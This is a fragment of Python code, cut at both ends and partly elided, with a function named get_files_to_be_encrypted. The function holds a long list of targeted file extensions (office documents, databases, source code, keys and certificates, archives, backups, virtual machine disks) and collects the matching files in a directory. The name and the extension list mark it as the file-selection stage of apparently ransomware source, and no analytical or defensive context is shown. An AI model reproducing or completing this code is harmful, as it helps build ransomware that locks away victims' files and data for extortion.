...
def get_files_to_be_encrypted(directory):
    ...
    file_formats = {".3DM", ".3DS", ".3G2", ".3GP", ".602", ".7Z", ".ACCDB", ".AES", ".AI", ".ARC", ".ASC", ".ASF", ".ASM", ".ASP", ".AVI", ".BACKUP", ".BAK", ".BAT", ".BMP", ".BRD", ".BZ2", ".C", ".CGM", ".CLASS", ".CMD", ".CPP", ".CRT", ".CS", ".CSR", ".CSV", ".DB", ".DBF", ".DCH", ".DER", ".DIF", ".DIP", ".DJVU", ".DOC", ".DOCB", ".DOCM", ".DOCX", ".DOT", ".DOTM", ".DOTX", ".DWG", ".EDB", ".EML", ".FLA", ".FLV", ".FRM", ".GIF", ".GPG", ".GZ", ".H", ".HWP", ".IBD", ".ISO", ".JAR", ".JAVA", ".JPEG", ".JPG", ".JS", ".JSP", ".KEY", ".LAY", ".LAY6", ".LDF", ".M3U", ".M4U", ".MAX", ".MDB", ".MDF", ".MID", ".MKV", ".MML", ".MOV", ".MP3", ".MP4", ".MPEG", ".MPG", ".MSG", ".MYD", ".MYI", ".NEF", ".ODB", ".ODG", ".ODP", ".ODS", ".ODT", ".ONETOC2", ".OST", ".OTG", ".OTP", ".OTS", ".OTT", ".P12", ".PAQ", ".PAS", ".PDF", ".PEM", ".PFX", ".PHP", ".PL", ".PNG", ".POT", ".POTM", ".POTX", ".PPAM", ".PPS", ".PPSM", ".PPSX", ".PPT", ".PPTM", ".PPTX", ".PS1", ".PSD", ".PST", ".RAR", ".RAW", ".RB", ".RTF", ".SCH", ".SH", ".SLDM", ".SLDX", ".SLK", ".SLN", ".SNT", ".SQL", ".SQLITE3", ".SQLITEDB", ".STC", ".STD", ".STI", ".STW", ".SUO", ".SVG", ".SWF", ".SXC", ".SXD", ".SXI", ".SXM", ".SXW", ".TAR", ".TBK", ".TGZ", ".TIF", ".TIFF", ".TXT", ".UOP", ".UOT", ".VB", ".VBS", ".VCD", ".VDI", ".VMDK", ".VMX", ".VOB", ".VSD", ".VSDX", ".WAV", ".WB2", ".WK1", ".WKS", ".WMA", ".WMV", ".XLC", ".XLM", ".XLS", ".XLSB", ".XLSM", ".XLSX", ".XLT", ".XLTM", ".XLTX", ".XLW", ".ZIP"}
    files_to_encrypted = [f"{directory}/{file}" for file in listdir(directory) if path.splitext(f"{directory}/{file}")[1].upper() in file_formats]
